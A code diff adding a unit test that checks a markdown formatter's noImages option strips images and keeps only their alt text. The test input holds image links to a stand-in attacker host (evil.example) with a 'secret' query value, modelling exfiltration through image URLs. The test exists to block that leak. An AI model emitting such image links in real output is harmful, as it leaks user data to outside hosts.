@@ -35,6 +35,14 @@ describe('formatMarkdown', () => {
     expect(html).toContain('Title')
   })
 
+  it('replaces images with their alt text when noImages is set', () => {
+    const html = formatMarkdown('Voir ![le graphe](https://evil.example/?d=secret) et <img src="https://evil.example/x" alt="brut">', { minDepth: 3, noHeadings: false, noImages: true })
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('evil.example')
+    expect(html).toContain('le graphe')
+    expect(html).toContain('brut')
+  })
+
   it('adds lazy loading to images', () => {
     const html = formatMarkdown('![alt](https://example.com/image.png)')
     expect(html).toContain('loading="lazy"')
